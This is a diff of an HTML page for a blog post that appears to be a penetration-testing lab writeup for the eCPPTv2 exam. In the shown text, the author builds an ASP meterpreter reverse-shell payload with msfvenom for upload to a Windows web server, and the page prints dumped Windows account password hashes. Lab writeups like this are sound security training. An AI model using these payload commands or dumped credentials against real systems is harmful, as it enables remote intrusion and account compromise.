@@ -11,11 +11,11 @@
     <link rel="stylesheet" href="web2.css" />
 
     
-    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="The Ultimate eCPPTv2 Writeup"/>
 <meta name="twitter:description" content="Who am I? I decided to take this exam when I was six months away from graduating college with a bachelor&rsquo;s degree in Cyber Security. The reason I wanted to take this exam was that I was dying to get a job in Cyber Security as a penetration tester and I did not feel like my degree gave me the knowledge or experience needed to get into the security role I wanted."/>
 
-    <meta property="og:title" content="The Ultimate eCPPTv2 Writeup" />
+<meta property="og:title" content="The Ultimate eCPPTv2 Writeup" />
 <meta property="og:description" content="Who am I? I decided to take this exam when I was six months away from graduating college with a bachelor&rsquo;s degree in Cyber Security. The reason I wanted to take this exam was that I was dying to get a job in Cyber Security as a penetration tester and I did not feel like my degree gave me the knowledge or experience needed to get into the security role I wanted." />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2021-05-16T21:53:31-04:00" />
@@ -42,13 +42,7 @@
   <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
 </svg>
           </a>
-        
-         <!-- <a href="https://www.twitter.com/grahamhelton3" target="_blank" rel="noreferrer noopener">
-            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
-  <title>Twitter</title>
-  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path> -->
-</svg>
-          </a>
+
         
           <a href="https://linkedin.com/in/kevhjelm/" target="_blank" rel="noreferrer noopener">
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
@@ -107,9 +101,9 @@ We downloaded the data to look for clues</p>
 <img src="images//devil/21_image_4.png" />
 <img src="images//devil/21_image_5.png" />
 <p>Since we are able to put files and execute them, we can add malware to the website
-We are going to generate a malware, with msfvenom source: <b>https://netsec.ws/?p=331</b>>
+We are going to generate a malware, with msfvenom source.
 Since it is a windows server we know it is using ASP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp</p>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your ip Address> LPORT=<Your Port to Connect On> -f asp > shell.asp</p>
 <img src="images//devil/images//devil/21_image_6.png" />
 <p>The above image did not work, we dont know if the windows system is a x64 or x86. WHen trying the above command our multi handler was listening and nothing happend. We then tried to do it again with a x86.</p>
 <img src="images//devil/21_image_7.png" />
@@ -150,9 +144,6 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d6
 babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
 <img src="images//devil/21_image_21.png" />
-
-
-
 <h3 id="looking-back-5">Conclusion</h3>
 <p> </p>
     </div>
